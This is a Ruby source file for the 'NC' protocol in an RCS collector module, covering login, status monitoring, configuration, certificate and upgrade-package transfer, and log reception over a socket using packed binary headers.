#
#  The NC protocol implementation
#

# from RCS::Common
require 'rcs-common/trace'

module RCS
module Collector

class NCProto
  include RCS::Tracer

  PROTO_OK      = 0x000F0001  # OK
  PROTO_NO      = 0x000F0002  # Error
  PROTO_BYE     = 0x000F0003  # Close the session
  PROTO_LOGIN   = 0x000F0004  # Authentication to the component
  PROTO_MONITOR = 0x000F0005  # Status of the component
  PROTO_CONF    = 0x000F0006  # New configuration
  PROTO_LOG     = 0x000F0007	# Logs from the component
  PROTO_VERSION = 0x000F0008	# Version information
  PROTO_UPGRADE = 0x000F0009	# auto-upgrade command
  PROTO_CERT    = 0x000F000A	# request for the certificate (first-time setup)

  HEADER_LENGTH = 8 # two int

  LOG_INFO	= 0x00
	LOG_ERROR	= 0x01
	LOG_DEBUG	= 0x02

  def initialize(socket)
    @socket = socket
  end

  def get_command
    begin
      # get the command
      command = @socket.read(HEADER_LENGTH)
      # decode the integer
      return command.unpack('I').first
    rescue Exception => e
      return nil
    end
  end

  def login(auth)
    # login command payload
    command = auth

    # the common header
    header = [PROTO_LOGIN].pack('I')
    header += [command.length].pack('I')

    # the whole message
    message = header + command

    # send and receive
    @socket.write message
    response = @socket.read(HEADER_LENGTH)

    # check if everything is ok
    return true if response.unpack('I') == [PROTO_OK]

    return false
  end

  def version
    # the version is an array of 16 bytes
    response = @socket.read(16).delete("\x00")

    # send the OK
    header = [PROTO_OK].pack('I')
    header += [0].pack('I')
    @socket.write header

    return response
  end

  def monitor
    # the status (OK, ERROR, WARN)
    status = @socket.read(16).delete("\x00")

    # 3 consecutive int
    disk, cpu, pcpu = @socket.read(12).unpack('III')

    # the status description
    desc = @socket.read(1024).delete("\x00")

    # send the OK
    header = [PROTO_OK].pack('I')
    header += [0].pack('I')
    @socket.write header

    return [status, desc, disk, cpu, pcpu]
  end

  def config(content)
    # the element have a new config
    unless content.nil? then
      # retro compatibility (260 byte array for the name)
      message = "config".ljust(260, "\x00")
      # len of the file
      message += [content.length].pack('I')
  
      # send the CONF command
      header = [PROTO_CONF].pack('I')
      header += [message.length].pack('I')
      @socket.write header + message + content
    end

    # the protocol support sending of multiple files in a loop
    # since we have only one file, notify the peer that there
    # are no more configs to be sent
    header = [PROTO_NO].pack('I')
    header += [0].pack('I')
    @socket.write header
  end

  def cert
    # read the cert
    content = File.open(Config.instance.file('rcs-network.pem'), 'rb') {|f| f.read}
    # len of the file
    message = [content.size].pack('I')

    # send the CERT command
    header = [PROTO_CERT].pack('I')
    header += [message.length].pack('I')
    @socket.write header + message + content
  end

  def upgrade(content)
    # the element have a new upgrade package
    unless content.nil? then
      # retro compatibility (260 byte array for the name)
      message = "upgrade.tar.gz".ljust(260, "\x00")
      # len of the file
      message += [content.length].pack('I')

      # send the UPGRADE command
      header = [PROTO_UPGRADE].pack('I')
      header += [message.length].pack('I')
      @socket.write header + message + content
    end

    # the protocol support sending of multiple files in a loop
    # since we have only one file, notify the peer that there
    # are no more files to be sent
    header = [PROTO_NO].pack('I')
    header += [0].pack('I')
    @socket.write header
  end

  def log
    # convert from C "struct tm" to ruby objects
    # tm_sec, tm_min, tm_hour, tm_mday, tm_mon, tm_year, tm_wday, tm_yday, tm_isdst
    struct_tm = @socket.read(4 * 9).unpack('I*')
    time = Time.gm(*struct_tm, 0)

    # type of the log
    type = @socket.read(4).unpack('I').first
    case type
      when LOG_INFO
        type = 'INFO'
      when LOG_ERROR
        type = 'ERROR'
      when LOG_DEBUG
        type = 'DEBUG'
    end
    # the message
    desc = @socket.read(1024).delete("\x00")

    return [time, type, desc]
  end

  
end #NCProto

end #Collector::
end #RCS::